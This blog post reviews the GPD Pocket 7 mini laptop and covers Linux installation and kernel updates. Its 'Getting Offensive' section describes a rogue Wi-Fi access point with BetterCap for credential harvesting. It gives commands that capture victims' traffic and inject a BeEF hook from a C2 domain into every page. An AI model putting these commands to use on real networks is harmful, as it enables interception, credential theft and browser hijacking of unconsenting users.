{
  "Source": "www.evilsocket.net",
  "Title": "GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup",
  "Link": "https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eIt’s no secret I’ve been recently playing with the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2\"\u003eGPD Pocket 7\u003c/a\u003e, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.google.com/search?\u0026amp;source=lnms\u0026amp;tbm=isch\u0026amp;q=open+zaurus+sl-c1000\"\u003eSharp Zaurus\u003c/a\u003e series. Considering that a \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/evilsocket/status/896847606072127488\"\u003elot of people were interested\u003c/a\u003e I decided to write this post to share my impressions, installation procedure and configuration tips.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg\" alt=\"gpd\"/\u003e\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003ch3 id=\"Specs\"\u003e\u003ca href=\"#Specs\" class=\"headerlink\" title=\"Specs\"\u003e\u003c/a\u003eSpecs\u003c/h3\u003e\u003cp\u003eLet’s start with the hardware specs of this sweet little thing:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e7-inch full-HD (1920×1200) IPS touch display\u003c/li\u003e\n\u003cli\u003eIntel Atom x7-Z8750 CPU (Quad Core) @ 1.6GHz\u003c/li\u003e\n\u003cli\u003e8GB RAM\u003c/li\u003e\n\u003cli\u003e128GB eMMC\u003c/li\u003e\n\u003cli\u003e7,000 mAh battery (12 hours battery life estimated)\u003c/li\u003e\n\u003cli\u003e802.11ac WiFi\u003c/li\u003e\n\u003cli\u003eBluetooth 4.1\u003c/li\u003e\n\u003cli\u003e1x USB 3.0 Type-C\u003c/li\u003e\n\u003cli\u003e1x USB 3.0 Type-A\u003c/li\u003e\n\u003cli\u003emicro HDMI\u003c/li\u003e\n\u003cli\u003e3.5mm headphone jack\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eNot bad at all!\u003c/strong\u003e right?\u003c/p\u003e\n\u003ch3 id=\"Installing-GNU-Linux\"\u003e\u003ca href=\"#Installing-GNU-Linux\" class=\"headerlink\" title=\"Installing GNU/Linux\"\u003e\u003c/a\u003eInstalling GNU/Linux\u003c/h3\u003e\u003cp\u003eDespite they should start shipping the Ubuntu 16.04 models in a few days (?), I decided to buy the Windows version, which means I had to install GNU/Linux from scratch and overcome/fix several hardware issues … since I’m a good guy, let me share with you the correct procedure :D\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eDownload your GNU/Linux distribution ISO ( in my case, it was Ubuntu 17.04 ).\u003c/li\u003e\n\u003cli\u003eClone \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/cawilliamson/ansible-gpdpocket\"\u003ethis repository\u003c/a\u003e and run the \u003ccode\u003ebootstrap-iso.sh\u003c/code\u003e script against the ISO file.\u003c/li\u003e\n\u003cli\u003eWrite the resulting \u003ccode\u003e~/bootstrap.iso\u003c/code\u003e file to an USB drive using UNetBootin or whatever you like.\u003c/li\u003e\n\u003cli\u003ePlug the USB drive to your GPD, turn it on and press the \u003ccode\u003eDEL\u003c/code\u003e button to enter BIOS and boot from it.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis will start the usual GNU/Linux installation procedure.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNOTE:\u003c/strong\u003e Data on USB Type-C still does not work, but efforts are being made about it, we only need to wait.\u003c/p\u003e\n\u003ch3 id=\"Updating-custom-Kernel-and-stuff\"\u003e\u003ca href=\"#Updating-custom-Kernel-and-stuff\" class=\"headerlink\" title=\"Updating custom Kernel and stuff.\"\u003e\u003c/a\u003eUpdating custom Kernel and stuff.\u003c/h3\u003e\u003cp\u003eAfter installation and the routine system update, you might want to periodically update the fixes and custom kernel from the repository, in order to do so you should run the \u003ccode\u003egpd-update\u003c/code\u003e script as root, this will take 2-3 hours since the kernel is going to be compiled on the device itself.\u003c/p\u003e\n\u003cp\u003eIf you are running Ubuntu 17.04 as me and are experiencing \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/cawilliamson/ansible-gpdpocket/issues/49\"\u003ethis issue\u003c/a\u003e, you might want to do the following instead:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMake sure apt is not locked and you have internet connectivity first.\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo rm -rf /usr/src/ansible-gpdpocket\nsudo git clone https://github.com/cawilliamson/ansible-gpdpocket.git /usr/src/ansible-gpdpocket\ncd /usr/src/ansible-gpdpocket\nsudo git reset --hard origin/master\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBefore you continue, edit the \u003ccode\u003eroles/boot/tasks/debian.yml\u003c/code\u003e file and \u003cstrong\u003eremove this block\u003c/strong\u003e from it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e- name: install intel-microcode (iso creation = no)\n  apt: name=intel-microcode\n  when: chroot == false\n  tags:\n  - boot\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e( Don’t worry, you already have Intel microcode installed )\u003c/p\u003e\n\u003cp\u003eAnd eventually start the update process itself:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAfter the update is over, reboot and you’re ready to go :)\u003c/p\u003e\n\u003ch3 id=\"Getting-Offensive\"\u003e\u003ca href=\"#Getting-Offensive\" class=\"headerlink\" title=\"Getting Offensive\"\u003e\u003c/a\u003eGetting Offensive\u003c/h3\u003e\u003cp\u003eAt this point, you have a quad core Intel cpu, GNU/Linux and an USB 3.0 port, I mean, imagination is the limit! \u003c/p\u003e\n\u003cp\u003ePersonally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8\u0026amp;psc=1\"\u003eUSB 3 hub\u003c/a\u003e, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).\u003c/p\u003e\n\u003cp\u003eHere’s a very ugly PoC of what I mean, I’m still waiting for a decent USB hub to be delivered by Amazon:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg\" alt=\"stuff\"/\u003e\u003c/p\u003e\n\u003cp\u003eIn its simplest form, my portable offensive configuration is:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eGPD powered by the aforementioned powerbank.\u003c/li\u003e\n\u003cli\u003eMain WiFi card connected to my smartphone (which is tethering via WiFi AP) as upstream.\u003c/li\u003e\n\u003cli\u003eAlfa AWUS036NHR 2000mW with a HUACAM HCM82 8dBi dualband antenna for rogue AP and packet injection.\u003c/li\u003e\n\u003cli\u003eSensepost MANA running in \u003ccode\u003esimple-nat\u003c/code\u003e mode.\u003c/li\u003e\n\u003cli\u003eBetterCap for credentials harvesting, pcap capture and reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode\u003esudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e… GOODBYE WIFI PINEAPPLE! :D\u003c/p\u003e\n\u003ch3 id=\"Impressions-amp-Links\"\u003e\u003ca href=\"#Impressions-amp-Links\" class=\"headerlink\" title=\"Impressions \u0026amp; Links\"\u003e\u003c/a\u003eImpressions \u0026amp; Links\u003c/h3\u003e\u003cp\u003eTL;DR: This device is \u003cstrong\u003eawesome\u003c/strong\u003e, expensive, but still, \u003cstrong\u003eawesome\u003c/strong\u003e.\u003c/p\u003e\n\u003ch5 id=\"Keyboard\"\u003e\u003ca href=\"#Keyboard\" class=\"headerlink\" title=\"Keyboard\"\u003e\u003c/a\u003eKeyboard\u003c/h5\u003e\u003cp\u003eYes the layout is a very weird displaced QWERTY and yes the keys are small … you’ll get used to it unless you have very big hands.\u003c/p\u003e\n\u003ch5 id=\"Battery-Life\"\u003e\u003ca href=\"#Battery-Life\" class=\"headerlink\" title=\"Battery Life\"\u003e\u003c/a\u003eBattery Life\u003c/h5\u003e\u003cp\u003eI didn’t try the battery life as I always use the powerbank (the USB devices are draining power, that would kill the internal 7000mAh battery), but people said they achieved \u003cstrong\u003e3 hours of intense gaming\u003c/strong\u003e on Windows, normal use on GNU/Linux should last quite long.\u003c/p\u003e\n\u003ch5 id=\"Display\"\u003e\u003ca href=\"#Display\" class=\"headerlink\" title=\"Display\"\u003e\u003c/a\u003eDisplay\u003c/h5\u003e\u003cp\u003eGreat definition and the \u003cstrong\u003etouchscreen\u003c/strong\u003e helps a lot navigating the menu … actually this is the very first time I find a touch screen to be really useful on Linux :D\u003c/p\u003e\n\u003ch5 id=\"Mouse\"\u003e\u003ca href=\"#Mouse\" class=\"headerlink\" title=\"Mouse\"\u003e\u003c/a\u003eMouse\u003c/h5\u003e\u003cp\u003eYeah the “mouse” is crap, but usable … as I said, touchscreen FTW!\u003c/p\u003e\n\u003ch5 id=\"Price\"\u003e\u003ca href=\"#Price\" class=\"headerlink\" title=\"Price\"\u003e\u003c/a\u003ePrice\u003c/h5\u003e\u003cp\u003eExpensive, from 500 to 600 USD … it’s a little nice toy but you’ll have to pay for it.\u003c/p\u003e\n\u003ch5 id=\"Speed-Usability\"\u003e\u003ca href=\"#Speed-Usability\" class=\"headerlink\" title=\"Speed / Usability\"\u003e\u003c/a\u003eSpeed / Usability\u003c/h5\u003e\u003cp\u003eDespite being an Atom, the CPU works great, as long as you don’t spawn 1000000000 apps you’ll do just fine … I mean, if \u003ca href=\"https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/\"\u003eyou can run a rogue GSM BTS on a RPi\u003c/a\u003e, this hardware is actually \u003cstrong\u003emore than just fine\u003c/strong\u003e.\u003c/p\u003e\n\u003ch5 id=\"Connectivity\"\u003e\u003ca href=\"#Connectivity\" class=\"headerlink\" title=\"Connectivity\"\u003e\u003c/a\u003eConnectivity\u003c/h5\u003e\u003cp\u003eInternal WiFi is super stable and has decent coverage, Bluetooth also works great.\u003c/p\u003e\n\u003ch5 id=\"Links\"\u003e\u003ca href=\"#Links\" class=\"headerlink\" title=\"Links\"\u003e\u003c/a\u003eLinks\u003c/h5\u003e\u003cp\u003eCheck …\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e… \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://reddit.com/r/GPDPocket/\"\u003ethis\u003c/a\u003e out to stay updated on mods and hacks …\u003c/li\u003e\n\u003cli\u003e… \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/cawilliamson/ansible-gpdpocket\"\u003ethis\u003c/a\u003e for custom kernel and fixes …\u003c/li\u003e\n\u003cli\u003e… \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/jwrdegoede/linux-sunxi\"\u003ethis\u003c/a\u003e for custom kernel developement …\u003c/li\u003e\n\u003cli\u003eand \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2\"\u003ethis\u003c/a\u003e for official updates.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e",
  "Date": "2017-08-15T15:13:21Z",
  "Author": "Simone Margaritelli"
}